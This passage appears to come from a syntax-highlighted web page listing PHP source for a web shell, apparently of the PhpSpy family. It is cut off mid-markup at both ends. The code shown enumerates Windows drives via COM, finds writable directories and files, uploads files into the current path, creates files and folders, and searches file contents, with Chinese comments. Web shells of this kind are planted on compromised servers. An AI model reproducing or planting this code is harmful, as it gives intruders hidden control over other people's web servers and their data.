#6699cc;\">width=<\/span><span style=\"color: #66cccc;\">\"100%\"<\/span> <span style=\"color: #6699cc;\">border=<\/span><span style=\"color: #66cccc;\">\"0\"<\/span> <span style=\"color: #6699cc;\">cellpadding=<\/span><span style=\"color: #66cccc;\">\"5\"<\/span> <span style=\"color: #6699cc;\">cellspacing=<\/span><span style=\"color: #66cccc;\">\"0\"<\/span><span style=\"color: #6699cc;\">&gt;<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #6699cc;\">&lt;tr&gt;<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #6699cc;\">&lt;td<\/span> <span style=\"color: #6699cc;\">width=<\/span><span style=\"color: #66cccc;\">\"100%\"<\/span><span style=\"color: #6699cc;\">&gt;<\/span><span style=\"color: #cc99cc;\">&lt;?php<\/span> <span style=\"color: #99cc99;\">echo<\/span> $<span style=\"color: #ffcc66;\">cwd_links<\/span>.<span style=\"color: #66cccc;\">' - '<\/span>.<span style=\"color: #cccccc; background-color: #2d2d2d;\">getChmod(<\/span>$<span style=\"color: #ffcc66;\">nowpath<\/span>).<span style=\"color: #66cccc;\">' \/ <\/span><span style=\"color: #66cccc; text-decoration: underline;\">'<\/span><span style=\"text-decoration: underline;\">.<\/span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">getPerms(<\/span><span style=\"text-decoration: underline;\">$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">nowpath<\/span><span style=\"text-decoration: underline;\">).<\/span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">getUser(<\/span><span style=\"text-decoration: underline;\">$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">nowpath<\/span><span style=\"text-decoration: underline;\">);<\/span><span style=\"color: #cc99cc; text-decoration: underline;\">?&gt;<\/span><span style=\"text-decoration: underline;\"> (<\/span><span style=\"color: #cc99cc; text-decoration: underline;\">&lt;?php<\/span><span style=\"text-decoration: underline;\"> <\/span><span style=\"color: #99cc99; text-decoration: underline;\">echo<\/span><span style=\"text-decoration: underline;\"> $<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">dir_writeable<\/span><span style=\"text-decoration: underline;\">;<\/span><span style=\"color: #cc99cc; text-decoration: underline;\">?&gt;<\/span><span style=\"text-decoration: underline;\">)<\/span><span style=\"color: #6699cc; text-decoration: underline;\">&lt;\/td&gt;<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #6699cc;\">&lt;td<\/span> <span style=\"color: #f2777a; font-weight: bold;\">nowrap<\/span><span style=\"color: #6699cc;\">&gt;&lt;input<\/span> <span style=\"color: #6699cc;\">class=<\/span><span style=\"color: #66cccc;\">\"bt\"<\/span> <span style=\"color: #6699cc;\">id=<\/span><span style=\"color: #66cccc;\">\"jumpto\"<\/span> <span style=\"color: #6699cc;\">name=<\/span><span style=\"color: #66cccc;\">\"jumpto\"<\/span> <span style=\"color: #6699cc;\">value=<\/span><span style=\"color: #66cccc;\">\"Jump t<\/span><span style=\"color: #66cccc; text-decoration: underline;\">o\"<\/span><span style=\"text-decoration: underline;\"> <\/span><span style=\"color: #6699cc; text-decoration: underline;\">type=<\/span><span style=\"color: #66cccc; text-decoration: underline;\">\"button\"<\/span><span style=\"color: #6699cc; text-decoration: underline;\">&gt;&lt;\/td&gt;<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #6699cc;\">&lt;\/tr&gt;<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #6699cc;\">&lt;\/table&gt;<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #6699cc;\">&lt;table<\/span> <span style=\"color: #6699cc;\">id=<\/span><span style=\"color: #66cccc;\">\"inputnav\"<\/span> <span style=\"color: #6699cc;\">width=<\/span><span style=\"color: #66cccc;\">\"100%\"<\/span> <span style=\"color: #6699cc;\">border=<\/span><span style=\"color: #66cccc;\">\"0\"<\/span> <span style=\"color: #6699cc;\">cellpadding=<\/span><span style=\"color: #66cccc;\">\"5\"<\/span> <span style=\"color: #6699cc;\">cellspacing=<\/span><span style=\"color: #66cccc;\">\"0\"<\/span><span style=\"text-decoration: underline;\"> <\/span><span style=\"color: #6699cc; text-decoration: underline;\">style=<\/span><span style=\"color: #66cccc; text-decoration: underline;\">\"display:none;\"<\/span><span style=\"color: #6699cc; text-decoration: underline;\">&gt;<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #6699cc;\">&lt;form<\/span> <span style=\"color: #6699cc;\">action=<\/span><span style=\"color: #66cccc;\">\"\"<\/span> <span style=\"color: #6699cc;\">method=<\/span><span style=\"color: #66cccc;\">\"post\"<\/span> <span style=\"color: #6699cc;\">id=<\/span><span style=\"color: #66cccc;\">\"godir\"<\/span> <span style=\"color: #6699cc;\">name=<\/span><span style=\"color: #66cccc;\">\"godir\"<\/span><span style=\"color: #6699cc;\">&gt;<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #6699cc;\">&lt;tr&gt;<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #6699cc;\">&lt;td<\/span> <span style=\"color: #f2777a; font-weight: bold;\">nowrap<\/span><span style=\"color: #6699cc;\">&gt;<\/span><span style=\"color: #f2777a; font-weight: bold;\">Current<\/span> <span style=\"color: #cccccc; background-color: #2d2d2d;\">Directory (<\/span><span style=\"color: #cc99cc;\">&lt;?php<\/span> <span style=\"color: #99cc99;\">echo<\/span> $<span style=\"color: #ffcc66;\">dir_writeable<\/span>;<span style=\"color: #cc99cc;\">?&gt;<\/span>, <span style=\"color: #cc99cc;\">&lt;?php<\/span> <span style=\"color: #99cc99;\">ec<\/span><span style=\"color: #99cc99; text-decoration: underline;\">ho<\/span><span style=\"text-decoration: underline;\"> <\/span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">getChmod(<\/span><span style=\"text-decoration: underline;\">$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">nowpath<\/span><span style=\"text-decoration: underline;\">);<\/span><span style=\"color: #cc99cc; text-decoration: underline;\">?&gt;<\/span><span style=\"text-decoration: underline;\">)<\/span><span style=\"color: #6699cc; text-decoration: underline;\">&lt;\/td&gt;<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #6699cc;\">&lt;td<\/span> <span style=\"color: #6699cc;\">width=<\/span><span style=\"color: #66cccc;\">\"100%\"<\/span><span style=\"color: #6699cc;\">&gt;&lt;input<\/span> <span style=\"color: #6699cc;\">name=<\/span><span style=\"color: #66cccc;\">\"view_writable\"<\/span> <span style=\"color: #6699cc;\">value=<\/span><span style=\"color: #66cccc;\">\"0\"<\/span> <span style=\"color: #6699cc;\">type=<\/span><span style=\"color: #66cccc;\">\"hidden\"<\/span><span style=\"text-decoration: underline;\"> \/<\/span><span style=\"color: #6699cc; text-decoration: underline;\">&gt;&lt;input<\/span><span style=\"text-decoration: underline;\"> <\/span><span style=\"color: #6699cc; text-decoration: underline;\">class=<\/span><span style=\"color: #66cccc; text-decoration: underline;\">\"input\"<\/span><span style=\"text-decoration: underline;\"> <\/span><span style=\"color: #6699cc; text-decoration: underline;\">name=<\/span><span style=\"color: #66cccc; text-decoration: underline;\">\"dir\"<\/span><span style=\"text-decoration: underline;\"> <\/span><span style=\"color: #6699cc; text-decoration: underline;\">value=<\/span><span style=\"color: #66cccc; text-decoration: underline;\">\"&lt;?php echo $nowpath;?&gt;\"<\/span><span style=\"text-decoration: underline;\"> <\/span><span style=\"color: #6699cc; text-decoration: underline;\">type=<\/span><span style=\"color: #66cccc; text-decoration: underline;\">\"text\"<\/span><span style=\"text-decoration: underline;\"> <\/span><span style=\"color: #6699cc; text-decoration: underline;\">style=<\/span><span style=\"color: #66cccc; text-decoration: underline;\">\"width:99%;margin:0 8px;\"<\/span><span style=\"text-decoration: underline;\">&gt;<\/span><span style=\"color: #6699cc; text-decoration: underline;\">&lt;\/td&gt;<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #6699cc;\">&lt;td<\/span> <span style=\"color: #f2777a; font-weight: bold;\">nowrap<\/span><span style=\"color: #6699cc;\">&gt;&lt;input<\/span> <span style=\"color: #6699cc;\">class=<\/span><span style=\"color: #66cccc;\">\"bt\"<\/span> <span style=\"color: #6699cc;\">value=<\/span><span style=\"color: #66cccc;\">\"GO\"<\/span> <span style=\"color: #6699cc;\">type=<\/span><span style=\"color: #66cccc;\">\"submit\"<\/span><span style=\"color: #6699cc;\">&gt;&lt;\/td&gt;<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #6699cc;\">&lt;\/tr&gt;<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #6699cc;\">&lt;\/form&gt;<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #6699cc;\">&lt;\/table&gt;<\/span>\n<span style=\"color: #cc99cc;\">&lt;?php<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> (<span style=\"color: #f2777a; font-weight: bold;\">IS_WIN<\/span> &amp;&amp; <span style=\"color: #f2777a; font-weight: bold;\">IS_COM<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">obj<\/span> = <span style=\"color: #99cc99;\">new<\/span> <span style=\"color: #6699cc;\">COM<\/span>(<span style=\"color: #66cccc;\">'scripting.filesystemobject'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> ($<span style=\"color: #ffcc66;\">obj<\/span> &amp;&amp; <span style=\"color: #cccccc; background-color: #2d2d2d;\">is_object(<\/span>$<span style=\"color: #ffcc66;\">obj<\/span>) &amp;&amp; $<span style=\"color: #ffcc66;\">obj<\/span>-<span style=\"color: #6699cc;\">&gt;<\/span><span style=\"color: #ffcc66;\">Drives<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">echo<\/span> <span style=\"color: #66cccc;\">'&lt;div class=\"drives\"&gt;'<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">DriveTypeDB<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">array(0<\/span> =&gt; <span style=\"color: #66cccc;\">'Unknow'<\/span>,<span style=\"color: #cccccc; background-color: #2d2d2d;\">1<\/span> =&gt; <span style=\"color: #66cccc;\">'Removable'<\/span>,<span style=\"color: #cccccc; background-color: #2d2d2d;\">2<\/span> =&gt; <span style=\"color: #66cccc;\">'Fixed'<\/span>,<span style=\"color: #cccccc; background-color: #2d2d2d;\">3<\/span> =<span style=\"text-decoration: underline;\">&gt; <\/span><span style=\"color: #66cccc; text-decoration: underline;\">'Network'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">4<\/span><span style=\"text-decoration: underline;\"> =&gt; <\/span><span style=\"color: #66cccc; text-decoration: underline;\">'CDRom'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">5<\/span><span style=\"text-decoration: underline;\"> =&gt; <\/span><span style=\"color: #66cccc; text-decoration: underline;\">'RAM Disk'<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">comma<\/span> = <span style=\"color: #66cccc;\">''<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">foreach<\/span>($<span style=\"color: #ffcc66;\">obj<\/span>-&gt;<span style=\"color: #ffcc66;\">Drives<\/span> <span style=\"color: #99cc99;\">as<\/span> $<span style=\"color: #ffcc66;\">drive<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> ($<span style=\"color: #ffcc66;\">drive<\/span>-&gt;<span style=\"color: #ffcc66;\">Path<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span>$<span style=\"color: #ffcc66;\">comma<\/span>.<span style=\"color: #66cccc;\">'&lt;a href=\"javascript:godir(\\''<\/span>.$<span style=\"color: #ffcc66;\">drive<\/span>-<span style=\"color: #6699cc;\">&gt;<\/span><span style=\"color: #ffcc66;\">Path<\/span>.<span style=\"color: #66cccc;\">'\/\\');\"<\/span><span style=\"color: #66cccc; text-decoration: underline;\">&gt;'<\/span><span style=\"text-decoration: underline;\">.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">DriveTypeDB<\/span><span style=\"text-decoration: underline;\">[$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">drive<\/span><span style=\"text-decoration: underline;\">-&gt;<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">DriveType<\/span><span style=\"text-decoration: underline;\">].<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'('<\/span><span style=\"text-decoration: underline;\">.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">drive<\/span><span style=\"text-decoration: underline;\">-&gt;<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">Path<\/span><span style=\"text-decoration: underline;\">.<\/span><span style=\"color: #66cccc; text-decoration: underline;\">')&lt;\/a&gt;'<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">comma<\/span> = <span style=\"color: #66cccc;\">'&lt;span&gt;|&lt;\/span&gt;'<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">echo<\/span> <span style=\"color: #66cccc;\">'&lt;\/div&gt;'<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"color: #cc99cc;\">?&gt;<\/span>\n<span style=\"color: #6699cc;\">&lt;\/div&gt;<\/span>\n<span style=\"color: #cc99cc;\">&lt;?php<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">findstr<\/span> = $<span style=\"color: #6699cc;\">_POST<\/span>[<span style=\"color: #66cccc;\">'findstr'<\/span>];\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">re<\/span> = $<span style=\"color: #6699cc;\">_POST<\/span>[<span style=\"color: #66cccc;\">'re'<\/span>];\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">tbhead(<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;tr class=\"alt1\"&gt;&lt;td colspan=\"7\" style=\"padding:5px;line-height:20px;\"&gt;'<\/span>)<span style=\"text-decoration: underline;\">;<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;form action=\"'<\/span>.$<span style=\"color: #ffcc66;\">self<\/span>.<span style=\"color: #66cccc;\">'\" method=\"POST\" enctype=\"multipart\/form-data\"&gt;&lt;div<\/span><span style=\"color: #66cccc; text-decoration: underline;\"> style=\"float:right;\"&gt;&lt;input class=\"input\" name=\"uploadfile\" value=\"\" type=\"file\" \/&gt; &lt;input class=\"bt\" name=\"doupfile\" value=\"Upload\" type=\"submit\" \/&gt;&lt;input name=\"uploaddir\" value=\"'<\/span><span style=\"text-decoration: underline;\">.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">nowpath<\/span><span style=\"text-decoration: underline;\">.<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'\" type=\"hidden\" \/&gt;&lt;input name=\"dir\" value=\"'<\/span><span style=\"text-decoration: underline;\">.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">nowpath<\/span><span style=\"text-decoration: underline;\">.<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'\" type=\"hidden\" \/&gt;&lt;\/div&gt;&lt;\/form&gt;'<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;a href=\"javascript:godir(\\''<\/span>.$<span style=\"color: #6699cc;\">_SERVER<\/span>[<span style=\"color: #66cccc;\">\"DOCUMENT_ROOT\"<\/span>].<span style=\"color: #66cccc;\">'\\');\"&gt;WebRoot&lt;\/a<\/span><span style=\"color: #66cccc; text-decoration: underline;\">&gt;'<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">' | &lt;a href=\"javascript:godir(\\'.\\');\"&gt;ScriptPath&lt;\/a&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">' | &lt;a href=\"javascript:godir(\\''<\/span>.$<span style=\"color: #ffcc66;\">nowpath<\/span>.<span style=\"color: #66cccc;\">'\\');\"&gt;View All&lt;\/a&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">' | View Writable ( &lt;a href=\"javascript:godir(\\''<\/span>.$<span style=\"color: #ffcc66;\">nowpath<\/span>.<span style=\"color: #66cccc;\">'\\',\\'dir\\');\"&gt;<\/span><span style=\"color: #66cccc; text-decoration: underline;\">Directory&lt;\/a&gt;'<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">' | &lt;a href=\"javascript:godir(\\''<\/span>.$<span style=\"color: #ffcc66;\">nowpath<\/span>.<span style=\"color: #66cccc;\">'\\',\\'file\\');\"&gt;File&lt;\/a&gt; )'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">' | &lt;a href=\"javascript:createdir();\"&gt;Create Directory&lt;\/a&gt; | &lt;a href=\"java<\/span><span style=\"color: #66cccc; text-decoration: underline;\">script:createfile(\\''<\/span><span style=\"text-decoration: underline;\">.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">nowpath<\/span><span style=\"text-decoration: underline;\">.<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'\\');\"&gt;Create File&lt;\/a&gt;'<\/span><span style=\"text-decoration: underline;\">);<\/span>\n\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;div style=\"padding:5px 0;\"&gt;&lt;form action=\"'<\/span>.$<span style=\"color: #ffcc66;\">self<\/span>.<span style=\"color: #66cccc;\">'\" method=\"POST\"&gt;Find s<\/span><span style=\"color: #66cccc; text-decoration: underline;\">tring in files(current folder): &lt;input class=\"input\" name=\"findstr\" value=\"'<\/span><span style=\"text-decoration: underline;\">.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">findstr<\/span><span style=\"text-decoration: underline;\">.<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'\" type=\"text\" \/&gt; &lt;input class=\"bt\" value=\"Find\" type=\"submit\" \/&gt; Type: &lt;input class=\"input\" name=\"writabledb\" value=\"'<\/span><span style=\"text-decoration: underline;\">.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">writabledb<\/span><span style=\"text-decoration: underline;\">.<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'\" type=\"text\" \/&gt;&lt;input name=\"dir\" value=\"'<\/span><span style=\"text-decoration: underline;\">.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">dir<\/span><span style=\"text-decoration: underline;\">.<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'\" type=\"hidden\" \/&gt; &lt;input name=\"re\" value=\"1\" type=\"checkbox\" '<\/span><span style=\"text-decoration: underline;\">.($<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">re<\/span><span style=\"text-decoration: underline;\"> ? <\/span><span style=\"color: #66cccc; text-decoration: underline;\">'checked'<\/span><span style=\"text-decoration: underline;\"> : <\/span><span style=\"color: #66cccc; text-decoration: underline;\">''<\/span><span style=\"text-decoration: underline;\">).<\/span><span style=\"color: #66cccc; text-decoration: underline;\">' \/&gt; Regular expressions&lt;\/form&gt;&lt;\/div&gt;&lt;\/td&gt;&lt;\/tr&gt;'<\/span><span style=\"text-decoration: underline;\">);<\/span>\n\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;tr class=\"head\"&gt;&lt;td&gt;&amp;nbsp;&lt;\/td&gt;&lt;td&gt;Filename&lt;\/td&gt;&lt;td width=\"16%\"&gt;Last mod<\/span><span style=\"color: #66cccc; text-decoration: underline;\">ified&lt;\/td&gt;&lt;td width=\"10%\"&gt;Size&lt;\/td&gt;&lt;td width=\"20%\"&gt;Chmod \/ Perms&lt;\/td&gt;&lt;td width=\"22%\"&gt;Action&lt;\/td&gt;&lt;\/tr&gt;'<\/span><span style=\"text-decoration: underline;\">);<\/span>\n\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #999999; font-style: italic;\">\/\/<\/span><span style=\"color: #999999; font-style: italic;\">&#26597;&#30475;&#25152;&#26377;&#21487;&#20889;&#25991;&#20214;&#21644;&#30446;&#24405;<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">dirdata<\/span>=<span style=\"color: #cccccc; background-color: #2d2d2d;\">array(<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">filedata<\/span>=<span style=\"color: #cccccc; background-color: #2d2d2d;\">array(<\/span>);\n\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> ($<span style=\"color: #ffcc66;\">view_writable<\/span> == <span style=\"color: #66cccc;\">'dir'<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">dirdata<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">GetWDirList(<\/span>$<span style=\"color: #ffcc66;\">nowpath<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">filedata<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">array(<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   } <span style=\"color: #99cc99;\">elseif<\/span> ($<span style=\"color: #ffcc66;\">view_writable<\/span> == <span style=\"color: #66cccc;\">'file'<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">dirdata<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">array(<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">filedata<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">GetWFileList(<\/span>$<span style=\"color: #ffcc66;\">nowpath<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   } <span style=\"color: #99cc99;\">elseif<\/span> ($<span style=\"color: #ffcc66;\">findstr<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">dirdata<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">array(<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">filedata<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">GetSFileList(<\/span>$<span style=\"color: #ffcc66;\">nowpath<\/span>, $<span style=\"color: #ffcc66;\">findstr<\/span>, $<span style=\"color: #ffcc66;\">re<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   } <span style=\"color: #99cc99;\">else<\/span> {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #999999; font-style: italic;\">\/\/ <\/span><span style=\"color: #999999; font-style: italic;\">&#30446;&#24405;&#21015;&#34920;<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #999999; font-style: italic;\">\/\/<\/span><span style=\"color: #999999; font-style: italic;\">scandir()&#25928;&#29575;&#26356;&#39640;<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">dirs<\/span>=@<span style=\"color: #cccccc; background-color: #2d2d2d;\">opendir(<\/span>$<span style=\"color: #ffcc66;\">dir<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">while<\/span> ($<span style=\"color: #ffcc66;\">file<\/span>=@<span style=\"color: #cccccc; background-color: #2d2d2d;\">readdir(<\/span>$<span style=\"color: #ffcc66;\">dirs<\/span>)) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">filepath<\/span>=$<span style=\"color: #ffcc66;\">nowpath<\/span><span style=\"color: #f2777a; font-weight: bold;\">.<\/span>$<span style=\"color: #ffcc66;\">file<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>(@<span style=\"color: #cccccc; background-color: #2d2d2d;\">is_dir(<\/span>$<span style=\"color: #ffcc66;\">filepath<\/span>)){\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">dirdb<\/span>[<span style=\"color: #66cccc;\">'filename'<\/span>]=$<span style=\"color: #ffcc66;\">file<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">dirdb<\/span>[<span style=\"color: #66cccc;\">'mtime'<\/span>]=<span style=\"color: #99cc99;\">@date<\/span>(<span style=\"color: #66cccc;\">'Y-m-d H:i:s'<\/span>,<span style=\"color: #cccccc; background-color: #2d2d2d;\">filemtime(<\/span>$<span style=\"color: #ffcc66;\">filepath<\/span>));\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">dirdb<\/span>[<span style=\"color: #66cccc;\">'dirchmod'<\/span>]=<span style=\"color: #cccccc; background-color: #2d2d2d;\">getChmod(<\/span>$<span style=\"color: #ffcc66;\">filepath<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span 